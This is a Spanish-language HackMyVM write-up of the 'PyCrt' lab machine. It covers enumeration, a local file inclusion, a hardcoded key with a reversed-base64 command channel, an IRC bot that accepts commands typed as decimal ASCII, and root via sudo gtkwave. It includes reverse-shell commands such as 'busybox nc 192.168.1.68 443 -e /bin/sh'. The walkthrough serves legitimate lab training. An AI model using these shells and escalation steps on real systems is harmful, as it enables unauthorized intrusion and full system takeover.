---
title: "PyCrt"
date: 2025-12-24
draft: false
description: "Writeup de la máquina PyCrt en HackMyVM."
categories: ["HackMyVM"]
tags: ["Local File Inclusion", "Remote Command Execution", "Insecure Cryptographic Logic", "Hardcoded Credentials", "Sudo Misconfiguration", "Abuse of Legitimate Functionality", "Privilege Escalation"]
image: "/images/pycrt.png"
level: Medium
---

# Enumeración

Iniciemos identificando la máquina víctima con ayuda de **Arp-Scan** :

```bash
arp-scan -I ens33 --localnet --ignoredups
```

![img1](images/Pasted%20image%2020251222162341.png)

Como podemos observar, la IP de la máquina víctima es `192.168.1.66`.

Vamos a realizar un escaneo para identificar primero los puertos abiertos con ayuda de **Nmap**:

```bash
nmap -p- --open -sS --min-rate 5000 -n -v -Pn 192.168.1.66 -oG allPorts
```

![img2](images/Pasted%20image%2020251222162741.png)

Como podemos observar tenemos los puertos `22,80,6667`, con esto en mente vamos a realizar un segundo escaneo para obtener información de estos puertos en específico:

```bash
nmap -p22,80,6667 -sVC 192.168.1.66 -oN target
```

![img3](images/Pasted%20image%2020251222163230.png)

Como podemos observar tenemos servicios `ssh, http y irc` corriendo, vamos a comenzar a enumerar el puerto `80` mirando su contenido:

![img4](images/Pasted%20image%2020251222163342.png)

Podemos ver que tenemos en sí la página por defecto de apache2.

Vamos a revisar mediante la herramienta de `irssi` la conexión por el puerto `6667` a ver que logramos encontrar:

```bash
irssi
```

![img5](images/Pasted%20image%2020251222163857.png)

![img6](images/Pasted%20image%2020251222163930.png)

Vemos algo de información y algo que llama nuestra atención en el banner es que nombra al directorio `ShadowSec` por lo que vamos a intentar ver si esto existe en la web:

![img7](images/{9C833D5B-66EE-44BC-B9A2-666F2C121EF7}.png)

Vemos la web, pero en realidad a más de esa información no tenemos nada, podemos intentar hacer un poco de fuzzing con **Gobuster** y buscar por archivos con extensión `.php`:

```bash
gobuster dir -u http://192.168.1.66/ShadowSec -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php
```

![img8](images/{D4CADFA2-3363-41A5-B893-400B56FE06CE}.png)

Como podemos observar tenemos un archivo llamado `bydataset.php`, vemos que hace:

![img9](images/{01DAF646-71A9-4973-BF54-DDA6E417240C}.png)

no vemos nada interesante, pero vamos a intentar ver como se está tramitando la petición con BurpSuite:

![img10](images/{420DB422-5AAA-439A-A83E-4043A361DEB3}.png)

# Explotación

La verdad es que no vemos nada del otro mundo y no tenemos información, algo que podemos intentar talvez es buscar por parámetros en la url, vamos a intentarlo con ayuda de **Wfuzz**:

```bash
wfuzz -c --hw=4 -t 200 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt "http://192.168.1.66/ShadowSec/bydataset.php?FUZZ"
```

![img11](images/{591FF419-BD49-4C96-9742-1EF8A361A31F}.png)

podemos observar que es diferente al usar `file`, veamos en BurpSuite que es lo que sale:

![img12](images/{C9F3C8C3-CFD9-4A39-89F4-DA32AEE2BEE2}.png)

vemos que nos dice un error de lectura del archivo, esto me llama la atención y podemos intuir un **Local File Inclusion (LFI)**, vemos si es posible:

![img13](images/{4804A85C-7B97-44FE-84A4-0A3108ED6BFF}.png)

perfecto, esto funciona, podemos intentar leer logs y más, pero no tenemos permisos, por lo que vamos a intentar leer el mismo archivo `bydataset.php` a ver si es posible:

![img14](images/{F7088DF2-D2B6-4FCF-8DCF-403A468CEFD9}.png)

Excelente, vamos a analizar el código a ver que podemos hacer:

![img15](images/Pasted%20image%2020251224141012.png)

Vemos que recibe también información por `POST`, con los parámetros `auth y payload`.

![img16](images/Pasted%20image%2020251224141140.png)

Vemos que `auth=LetMeIn123!` y que luego se llama a una función `decrypt` y enviamos el payload.

Hasta este punto vamos a intentar con la información que tenemos para ver que obtenemos:

![img17](images/Pasted%20image%2020251224141408.png)

Bueno, algo pasa con el payload, veamos que hace la función `decrypt`:
![img18](images/Pasted%20image%2020251224141609.png)

Vemos que la función primero pone la cadena en reversa, luego hace decode de base64, entonces hasta allí yo lo que haría es mandar una cadena en base64 reversa, para lograr que al entrar en la función la ponga normal y luego haga el decode de base64, ahora el objetivo es entrar en el tercer apartado para que no retorne el `false` donde al parecer busca `cmd:` en la cadena para entrar, entonces vamos a hacer lo siguiente primero para probar:

```bash
echo "cmd:whoami" | base64 | rev
```

![img19](images/{1CC78D2A-4F3B-4480-B8FF-FE821664C7AF}.png)

ahora eso vamos a enviarlo en payload a ver que logramos:

![img20](images/{BD90F666-190D-45E1-A2D2-6185BBFDD41E}.png)

Vemos que se ejecuta el `whoami`, ya tenemos una forma de ejecutar comandos.

Ya con esto vamos a intentar entablar una Reverse Shell de la siguiente manera:

```bash
echo "cmd:busybox nc 192.168.1.68 443 -e /bin/sh" | base64 | rev
```

![img21](images/{9BA47F30-19F9-4CFF-8966-1006CDAF04CE}.png)

ya con esto generamos la Reverse shell:

```bash
nc -nlvp 443
```

![img22](images/{C9AD1B5E-9635-43CC-BF2E-6F7C2927B840}.png)

![img23](images/{75D45F67-3041-4A13-80E7-3451D4B4717A}.png)

Listo ya tenemos la Reverse Shell, vamos a darle tratamiento y comenzamos a enumerar:

![img24](images/{DBBF60DD-735F-4DDF-A0F0-70E1DE190E79}.png)

# Escalada de Privilegios

Podemos observar como tenemos permiso para ejecutar como `chatlake` el binario de weechat, vamos a ver que podemos hacer ya dentro:

```bash
sudo -u chatlake /usr/bin/weechat
```

![img25](images/{82CD5AA1-00D0-4342-A698-6C0E03ED706C}.png)

algo que tenemos que saber es que mediante una conexión nosotros podemos ejecutar comandos con `/exec <comando>`, quedando de la siguiente manera:

![img26](images/{97FCB00B-3A13-498C-B9A0-3F2C5C413FCC}.png)

perfecto, lo que voy a hacer es generar otra reverse shell para poder quedar como el usuario `chatlake` ejecutando `/exec busybox nc 192.168.1.68 444 -e /bin/sh`:

![img27](images/{EC6B7538-A9DA-4B19-855D-26B5B77A7859}.png)

Listo, volvemos a intentar dar un tratamiento y luego comenzamos a enumerar.

En este usuario encontramos la flag de usuario.

![img28](images/{F49A9027-36FC-4FBB-BBC0-97900A09C0F7}.png)

![img29](images/{4F0ACD83-8644-40D0-804C-2ECC6DCEB493}.png)

Como observamos podemos iniciar un servicio sin necesidad de introducir contraseña, podemos hacerlo para ver que logramos.

![img30](images/{F4F49883-1FE5-4502-B04E-7F395229CE80}.png)

Listo ahora el revisar, enumerar y buscar donde o que podemos aprovechar en este servicio es una opción, pero la verdad no encontré nada, con eso en mente lo que hice es volver a conectarme al IRC, para ver si algo cambio:

![img31](images/Pasted%20image%2020251224152932.png)

a comparación de la primera vez ahora tenemos 6 canales disponibles, en este caso nos conectamos a todos y enviamos mensajes esperando respuestas o algo:

![img32](images/{0B86E75F-E9F1-45F5-83C5-E00B41808593}.png)

podemos observar que llega un mensaje que nos dice que al final de los mensajes mandemos un `:)`, vamos a intentarlo en los diferentes chats a ver que logramos:

![img33](images/{4AA6F875-6662-4BEE-92FC-F08AE36AB984}.png)

se genera una nueva conversación donde vemos lo siguiente:

![img34](images/{0B935E4D-2A6A-4981-8EDD-EA9F2F8E5030}.png)

veamos con números:

![img35](images/{126D3E36-F34A-47E6-97C9-BEAFAF1C2463}.png)

![img36](images/{085EF87B-1B5E-44FA-806A-DD161B416D36}.png)

vemos lo mismo, podemos intentar enviar mensajes en los diferentes chats a ver si en alguno el mensaje cambia:

![img37](images/{EE5439EE-9756-4542-B367-45220FA94212}.png)

![img38](images/{2A1DF68D-FEDC-4B85-8908-9EF3A3AC29C1}.png)

Vemos que en el canal 2 cambia el mensaje y vemos que dice que la ejecución del comando no se permitió.

Si recordamos, teníamos una web con información donde tenemos `operative: ll104567`, podemos intentar cambiar el nick a ese valor para ver que logramos, para esto hacemos un `/nick ll104567`:

![img39](images/{E9850FA2-019E-4F49-8F52-59D6DDE1A1E4}.png)

perfecto ahora volvemos a intentar con el mensaje del numero a ver que sucede:

![img40](images/{3A352884-B90C-4369-A2B6-35280D4D3F7E}.png)

vemos lo mismo, intentamos con las demás salas a ver si alguna cambia:

![img41](images/{2B3268E6-B960-4D1A-8454-2DC62F582F0A}.png)

Podemos observar que al enviarlo desde el `chan1` logramos ver una `A`, esto es algo extraño, pero y si intentamos enviar letras en formato ascii:

![img42](images/{899A6D1E-E334-4B79-A6E1-645F8B20AE75}.png)

intentemos con la `d` en format decimal que sería el `100`:

![img43](images/{3DBB7B58-560C-4DB7-BF68-67872EB7A3D0}.png)

Esto funciona, enviemos combinaciones simples como `id` a ver si se ejecuta `105 100:)`:

![img44](images/{2224E7BF-A896-47B5-B376-7D27E9524B44}.png)

vemos que sigue sin ser autorizado, pero vamos a intentar con diferentes comandos y para automatizar el proceso de pasar los valores a decimal se utilizara el siguiente script:

```python
import sys
def main():
    command=sys.argv[1]
    command_decimal = ''
    for char in command:
        command_decimal += str(ord(char)) + " "
    print(f"comand: {command_decimal}:)")
if __name__ == '__main__':
    main()
```

![img45](images/{49D08AA1-5843-4687-B6CB-8409959E285B}.png)

![img46](images/{A64FE51B-1877-463E-ADA4-A464B96D7DF9}.png)

listo con esto ya podemos volver a generar una Reverse Shell para estar como el usuario `pycrtlake`:

![img47](images/{5711073E-EE85-443E-B791-94B4AE8B495C}.png)
![img48](images/{630FC8BE-DC2C-429B-894D-B254A3256EDD}.png)

Listo, ahora le damos tratamiento y comenzamos a enumerar.

![img49](images/{ABB7C062-0275-429B-B024-48CE392049F5}.png)

Vemos que podemos ejecutar `gtkwave` como root.

Nosotros mediante `gtkwave` podemos inicializar una consola interactiva TCL, el problema es que para esto necesitamos GUI pero al no tenerla esto fallara.

Vamos a emular un `Display` con ayuda de `Xvfb` de la siguiente manera:

```bash
Xvfb :1 &
```

![img50](images/{29C7FF23-FB5C-4C84-99A2-E022C4898A18}.png)

Ya con esto usaremos `gtkwave` donde con el parámetro `-W` e indicando el `Display` a usar que será el `1` vamos a ejecutarlo de la siguiente manera:

```bash
sudo DISPLAY=:1 /usr/bin/gtkwave -W
```

![img51](images/{5DA118C3-9DD7-4E7A-AC1F-D330570A8C9C}.png)

Tenemos la consola interactiva como `root`.

Ya podemos ver la flag:

![img52](images/{2B5443FC-8992-449F-9C3D-37776B6954B9}.png)

Lab Terminado.
![img53](images/{A7276E19-2262-43C5-B31A-010F15E53D18}.png)
